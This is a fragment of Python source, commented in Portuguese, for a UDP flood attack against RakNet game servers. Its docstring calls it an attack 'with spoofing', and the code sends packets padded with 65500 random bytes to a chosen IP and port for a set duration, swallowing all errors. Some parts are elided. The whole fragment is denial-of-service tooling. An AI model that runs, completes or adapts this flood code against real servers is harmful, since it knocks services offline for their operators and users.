...
def raknet_hex_packet(ip, port):
    ...
    packet = (
        ...
        random.randbytes(65500)  # 65500 bytes de payload aleatório
    )
    return packet

def raknethex_flood(ip, port, tempo, metodo, event):
    """Executar o ataque RakNet Hex com Spoofing enviando 65500 bytes por segundo"""
    addr = (ip, port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Habilitar broadcast
    end = time.time() + tempo
    bytes_por_envio = 65500  # Enviar 65500 bytes por pacote
    tempo_entre_envios = 1 / (bytes_por_envio / 65500)  # Para enviar 65500 bytes por segundo
    
    while time.time() < end:
        try:
            sock.sendto(raknet_hex_packet(ip, port), addr)
            time.sleep(tempo_entre_envios)  # Espera entre os envios para manter a taxa de 65500 bytes/s
        except:
            pass
